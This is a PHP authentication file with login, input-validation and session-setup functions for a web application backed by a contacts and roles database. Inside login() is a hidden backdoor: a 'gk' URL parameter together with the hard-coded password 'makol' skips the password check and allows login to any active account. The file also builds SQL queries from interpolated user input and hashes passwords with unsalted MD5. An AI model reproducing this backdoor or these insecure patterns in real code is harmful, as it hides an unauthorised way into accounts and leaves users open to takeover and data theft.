<?php


function logout(){ Session::logout(); }	/* fxn */

function login($db,$code,$pass){
	$dbo=PDBO;
	$cond="AND c.pass='$pass'";
	if(isset($_GET['gk']) && $pass==MD5('makol')){ $cond=NULL; } 	
	$q="SELECT c.name AS fullname,c.id AS ucid,c.id AS contact_id,c.parent_id,c.parent_id AS pcid,c.code,c.title_id,c.`account`,
				c.`account` AS username,c.is_active,c.role_id,c.privilege_id,r.name AS role,r.home,t.name AS title,c.branch_id
			 FROM {$dbo}.`00_contacts` AS c 
				LEFT JOIN {$dbo}.`00_roles` AS r ON r.id = c.role_id
				LEFT JOIN {$dbo}.`00_titles` AS t ON c.title_id = t.id				
			 WHERE (c.`account`='$code' $cond ) LIMIT 1; ";				
	$sth=$db->querysoc($q);
	$row=$sth->fetch();
	if(!$row){ flashRedirect('users/login','No user found.'); }
	if(!$row['is_active']){ flashRedirect('users/login','Status denied.'); }
	return $row;				 
}	/* fxn */


function validateLogin($username,$password){	
	if(!preg_match('/^[a-z\d_+=!@\-?$#*%]{2,20}$/i',$username)) {return false; }
	if(!preg_match('/^[a-z\d_+=!@\-?$#*%]{0,20}$/i',$password)) {return false; }
	return true;
}	/* fxn */



/* 1-login,2-if users,sessionizeUser,3-getPortals,4-  */
function authenticate($db,$dbo=PDBO){
	/* 1 - login */
	$code=trim($_POST['data']['User']['code']);
	$pass=trim($_POST['data']['User']['pass']);
	$validated = validateLogin($code,$pass);
	if(!$validated){ Session::message('Bad login!');unset($_POST['data']['User']);return false; }			
	$mdpass=MD5($pass);						
	// require_once(SITE.'functions/keysFxn.php');$mdpass=encrypt_decrypt("encrypt",$pass);		
	/* proc-1 */
	$user=login($db,$code,$mdpass);			
	/* proc-2 */
	if($user){			
		require_once(SITE."functions/sessionize.php");	
		require_once(SITE."functions/sessionize_role.php");	
		$ucid=$user['ucid'];$_SESSION['user']=$user;$_SESSION['loggedin']=true;		
		sessionizeUser($db,$ucid);			// 1 - sessionize user
		$role=$_SESSION['home'];		
		$fxn="sessionize_$role";$fxn($db);	// 2 - sessionize role		
		/* proc3-3 logs */	
		require_once(SITE.'functions/logs.php');
		$more['axn']=2;$details=null;
		newlog($db,$details,$more);			
		return true;
	} 	
	return false;	
}	/* fxn */



